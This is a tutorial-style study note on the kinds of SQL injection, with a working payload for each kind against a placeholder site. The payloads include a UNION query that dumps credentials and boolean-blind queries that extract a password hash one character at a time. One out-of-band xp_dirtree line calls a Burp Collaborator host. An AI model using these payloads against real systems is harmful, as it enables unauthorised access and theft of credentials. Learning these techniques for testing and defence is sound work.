# Types of SQL Injection

![](../../_attachments/Pasted%20image%2020250202005406.png)

## In-band (Classic)

In-band SQLi occurs when the attacker uses the same communication channel to both launch the attack and gather the result of the attack. Retrieved data is presented directly on the application web page.

- Easier to exploit than other categories of SQLi.

### Error-Based SQLi

Error-based SQLi is an in-band SQLi technique that forces the database to generate an error, giving the attacker information upon which to refine their injection.

#### Example:

**Input:**

```sql
www.random.com/app.php?id='
```

**Output:**

```
You have an error in your SQL syntax, check the manual that corresponds to your MySQL server version ...
```

### Union-Based SQLi

Union-based SQLi is an in-band SQLi technique that leverages the `UNION` SQL operator to combine the results of two queries into a single result set.

#### Example:

**Input:**

```sql
www.random.com/app.php?id=' UNION SELECT username, password FROM users --
```

**Output:**

```
carlos
afibh9cjnkuwcsfobs7h
administrator
tn8f921skp5dzoy7hxpk
```

## Inferential (Blind)

Inferential SQLi occurs when there is no direct transfer of data via the web application. However, the attacker can still reconstruct the information by sending specific requests and observing the resulting behavior of the database server.

- Just as dangerous as in-band SQL injection.
- Takes longer to exploit than in-band SQL injection.

### Boolean-Based Blind SQLi

Boolean-based SQLi is a blind SQLi technique that uses Boolean conditions to return different results depending on whether the query returns `TRUE` or `FALSE`.

#### Example:

**Input URL:**

```sql
www.random.com/app.php?id=1
```

**Backend Query:**

```sql
SELECT title FROM product WHERE id=1
```

**Payload #1 (False):**

```sql
www.random.com/app.php?id=1 AND 1=2
```

**Backend Query:**

```sql
SELECT title FROM product WHERE id=1 AND 1=2
```

**Payload #2 (True):**

```sql
www.random.com/app.php?id=1 AND 1=1
```

**Backend Query:**

```sql
SELECT title FROM product WHERE id=1 AND 1=1
```

**Users Table:**

```
Administrator / e3c33e889e0e1b62cb7f65c63b60c42bd77275d0e730432fc37b7e624b09ad1f
```

**Extracting Data Example:**

```sql
www.random.com/app.php?id=1 AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) = 's'
```

**Backend Query:**

```sql
SELECT title FROM product WHERE id=1 AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) = 's'
```

If nothing is returned on the page → `False` → `'s'` is NOT the first character of the hashed password.

Try another letter:

```sql
www.random.com/app.php?id=1 AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) = 'e'
```

If a title is returned on the page → `True` → `'e'` IS the first character of the hashed password.

### Time-Based Blind SQLi

Time-based SQLi is a blind SQLi technique that relies on the database pausing for a specified amount of time, then returning the results, indicating a successful SQL query execution.

#### Example Query:

If the first character of the administrator's hashed password is `'a'`, wait for 10 seconds.

- **Response takes 10 seconds →** First letter is `'a'`
- **Response does not take 10 seconds →** First letter is not `'a'`

## Out-of-Band SQLi

Out-of-band SQLi occurs when an attacker triggers an out-of-band network connection to a system they control. This technique is less common but can be very powerful.

- A variety of protocols can be used (e.g., DNS, HTTP).

#### Example Payload:

```sql
EXEC master..xp_dirtree '//0efdymgwlo5w9inae8mg4dfrgim9ay.burpcollaborator.net/a' --
```
